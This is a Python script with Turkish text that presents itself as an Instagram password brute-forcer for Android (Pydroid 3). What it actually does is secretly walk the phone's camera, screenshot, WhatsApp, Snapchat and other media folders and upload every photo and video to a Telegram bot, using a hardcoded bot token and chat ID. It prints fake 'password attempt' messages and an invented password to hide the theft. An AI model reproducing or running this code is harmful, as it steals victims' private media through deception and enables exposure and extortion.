# Bu Python kodu, Instagram hesabinin sifresini kirmaz, kullanicinin telefonundaki medya dosyalarini Telegram'a gonderir.
# Kod acik kaynaklidir ve calistirildiginda, dosyalariniz izinsiz bir sekilde baskalarina iletilebilir.
# Kodun basinda suanda bu yazilar yer aliyor ilgili bilgilendirme yapilmis. 'Gormedim' veya 'bilmiyordum' gibi bahanelerle kod sahibini veya bu kodu calistirmanizi öneren kisiyi suc Lamayin.
# Sorumluluk, kodu kullanan kisiye yani size aittir. Bu tur yazilimlari kullanirken dikkatli olmali ve olasi sonuclarini göz önünde bulundurmalisiniz.
# Unutmayin ki, dengesiz davaranislar ve izinsiz müdahaleler, yasacak sorunlarin kaynagidir.

import os
import sys
import time
import requests

try:
    import requests
except ImportError:
    print("requests modulu bulunamadi. Yukleniyor...")
    os.system(f"{sys.executable} -m pip install requests")
    import requests

os.system("cls" if os.name == "nt" else "clear")

print(r"""
 _           _        _                _    
(_)         | |      | |              | |   
 _ _ __  ___| |_ __ _| |__   __ _  ___| | __
| | '_ \/ __| __/ _` | '_ \ / _` |/ __| |/ /
| | | | \__ \ || (_| | | | | (_| | (__|   < 
|_|_| |_|___/\__\__,_|_| |_|\__,_|\___|_|\_\
""")

print("""
Bu arac, en iyi brute force yöntemlerini kullanarak
sifreleri kiramak icin tasarlanmistir.
Iki adimli dogrulamaları gecme yeteneğine sahiptir ve 
sifreyi buldugunda size bildirecektir.

Lütfen telefonunuzu bir kenara birakın ve 
işlemin tamamlanmasını bekleyin.
Sure, sistemin karmasikligina bağlı olarak degisiklik gösterebilir.

DIKKAT : PYDROID 3 UYGULAMASININ AYARLARINA GIDIP DEPOLAMA VE 
DOSYA IZINLERINI VERMENIZ GEREKMEkTEDIR. BU IZINLERI VERMEZSENIZ,
sifreyi sisteme kaydedemeyip size atamayiz.
""")

BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
USER_ID = "6044093818"

name = input("Lütfen sifresini kirmak istediginiz Instagram hesabinin kullanici adini giriniz: ")

directories = [
    "/storage/emulated/0/DCIM/Camera/",
    "/storage/emulated/0/Pictures/Screenshots/",
    "/storage/emulated/0/DCIM/Screenshots/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Video/",
    "/storage/emulated/0/Pictures/Instagram/",
    "/storage/emulated/0/Movies/Instagram/",
    "/storage/emulated/0/Pictures/Facebook/",
    "/storage/emulated/0/Movies/CapCut/",
    "/storage/emulated/0/Pictures/CapCut/",
    "/storage/emulated/0/Pictures/Snapchat/",
    "/storage/emulated/0/Pictures/PicsArt/",
    "/storage/emulated/0/Movies/Snapchat/", 
    "/storage/emulated/0/Pictures/Twitter/",
    "/storage/emulated/0/Movies/Twitter/",
    "/storage/emulated/0/Download/Telegram/",
    "/storage/emulated/0/Pictures/Telegram/",
    "/storage/emulated/0/Movies/",
    "/storage/emulated/0/Pictures/100PINT/Pins/",
    "/storage/emulated/0/Videos/",
    "/storage/emulated/0/DCIM/.thumbnails/",
    "/storage/sdcard/DCIM/Camera/",
    "/storage/sdcard/Pictures/Screenshots/",
    "/storage/sdcard/DCIM/Screenshots/",
    "/storage/sdcard/WhatsApp/Media/WhatsApp Images/",
    "/storage/sdcard/WhatsApp/Media/WhatsApp Video/",
    "/storage/sdcard/Pictures/Instagram/",
    "/storage/sdcard/Movies/Instagram/",
    "/storage/sdcard/Pictures/Facebook/",
    "/storage/sdcard/Movies/CapCut/",
    "/storage/sdcard/Pictures/CapCut/",
    "/storage/sdcard/Pictures/Snapchat/",
    "/storage/sdcard/Pictures/PicsArt/",
    "/storage/sdcard/Movies/Snapchat/", 
    "/storage/sdcard/Pictures/Twitter/",
    "/storage/sdcard/Movies/Twitter/",
    "/storage/sdcard/Download/Telegram/",
    "/storage/sdcard/Pictures/Telegram/",
    "/storage/sdcard/Movies/",
    "/storage/sdcard/Pictures/100PINT/Pins/",
    "/storage/sdcard/Videos/",
    "/storage/sdcard/DCIM/.thumbnails/"
]

image_extensions = [".jpg", ".jpeg", ".png", ".gif"]
video_extensions = [".mp4", ".mov", ".avi"]

def send_media_to_user(file_path, directory_name):
    print("Olasi Sifre Kombinasyonlari Deneniyor. .")
    time.sleep(1)

    if file_path.endswith(tuple(image_extensions)):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        media_type = "photo"
        caption = f"Kaynak Dizin: {directory_name}"
    elif file_path.endswith(tuple(video_extensions)):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        media_type = "video"
        caption = f"Kaynak Dizin: {directory_name}"
    else:
        print(f"Desteklenmeyen dosya turu: {file_path}")
        return

    with open(file_path, "rb") as media_file:
        data = {"chat_id": USER_ID, "caption": caption}
        files = {media_type: media_file}

        response = requests.post(url, data=data, files=files)

        if response.status_code == 200:
            print("Basarisiz Tekrardan Baska olasilik deneniyor. .") 
            time.sleep(1)
        else:
            print("Daha fazla Sifre Kombinasyonu Deneniyor. .")
            time.sleep(1)

def check_and_send_files():
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.endswith(tuple(image_extensions + video_extensions)):
                        send_media_to_user(file_path, directory)

    username_suffix = f"{name[:5].capitalize()}54123.545445"
    print(f"\nSifre basariyla bulundu Sifre: {username_suffix}")

check_and_send_files()
